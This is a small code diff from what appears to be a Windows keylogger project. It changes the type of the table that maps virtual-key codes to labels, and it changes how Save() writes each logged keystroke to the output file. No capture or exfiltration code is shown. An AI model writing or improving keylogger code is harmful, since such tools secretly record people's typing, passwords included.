@@ -18,8 +18,8 @@
 // or you will get problems since every function uses this variable.
 
 #if FORMAT == 0
-const std::map<unsigned, std::string> keyname{ 
-    {VK_BACK,   "[BACKSPACE]" },
+const std::map<int, std::string> keyname{ 
+	{VK_BACK, "[BACKSPACE]" },
 	{VK_RETURN,	"\n" },
 	{VK_SPACE,	"_" },
 	{VK_TAB,	"[TAB]" },
@@ -148,7 +148,7 @@ int Save(int key_stroke)
 #else
 	if (keyname.find(key_stroke) != keyname.end())
 	{
-		output << keyname[key_stroke];
+		output << keyname.at(key_stroke);
 	}
 	else
 	{
